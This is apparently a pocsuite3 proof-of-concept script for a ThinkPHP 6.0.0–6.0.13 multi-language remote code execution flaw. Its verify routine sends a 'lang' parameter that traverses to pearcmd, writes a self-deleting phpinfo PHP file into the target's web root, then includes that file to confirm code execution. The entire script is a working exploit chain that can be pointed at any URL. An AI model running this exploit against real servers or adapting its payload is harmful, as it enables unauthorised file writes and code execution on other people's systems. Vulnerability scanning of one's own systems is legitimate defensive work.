from collections import OrderedDict
from urllib.parse import urljoin
import re,random
from pocsuite3.api import POCBase, Output, register_poc, logger, requests, OptDict, OptString, VUL_TYPE
from pocsuite3.api import REVERSE_PAYLOAD, POC_CATEGORY
import json
import os


class POC(POCBase):
    vulID = '0'  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
    version = '1'  # 默认为1
    author = ['']  # PoC作者的大名
    vulDate = '2022-12-13'  # 漏洞公开的时间,不知道就写今天
    createDate = '2022-12-13'  # 编写 PoC 的日期
    updateDate = '2022-12-13'  # PoC 更新的时间,默认和编写时间一样
    references = ['']  # 漏洞地址来源,0day不用写
    name = 'Thinkphp-multi-language-rce'  # PoC 名称
    appPowerLink = ''  # 漏洞厂商主页地址
    appName = 'Thinkphp'  # 漏洞应用名称
    appVersion = '''6.0.0 <= ThinkPHP <= 6.0.13'''  # 漏洞影响版本
    vulType = VUL_TYPE.UPLOAD_FILES  # 漏洞类型,类型参考见 漏洞类型规范表
    desc = '''
        如果 Thinkphp 程序开启了多语言功能，那就可以通过传入特定参数，实现目录穿越和文件包含，包含特定文件即可实现命令执行。
    '''

  # 漏洞简要描述
    samples = ['']  # 测试样列,就是用 PoC 测试成功的网站
    install_requires = ['']  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    pocDesc = '''
    检测:pocsuite -r .\poc++.py -u url(-f url.txt) --verify
    '''
    category = POC_CATEGORY.EXPLOITS.REMOTE

    def _verify(self):
        result = {}
        num = str(random.randint(10000,999999))
        path = "/index.php?lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/<?=phpinfo();unlink(__FILE__);?>+/var/www/html/test"+num+".php"
        path_2 = "/index.php?lang=../../../../../../../../../../../../../var/www/html/test"+num+""
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36',
        }
        url = self.url + path
        try:
            resq = requests.get(url=self.url+path,headers=headers,timeout=5)
            resq_2 = requests.get(url=self.url+path_2,headers=headers,timeout=5)
            if 'PHP Version' in resq_2.text:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['POC'] = self.url+path
        except Exception as e:
            print(e)
            return
        return self.parse_output(result)

    def _attack(self):
        return self._verify()

    def parse_attack(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output

    def _shell(self):
        return

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output
register_poc(POC)
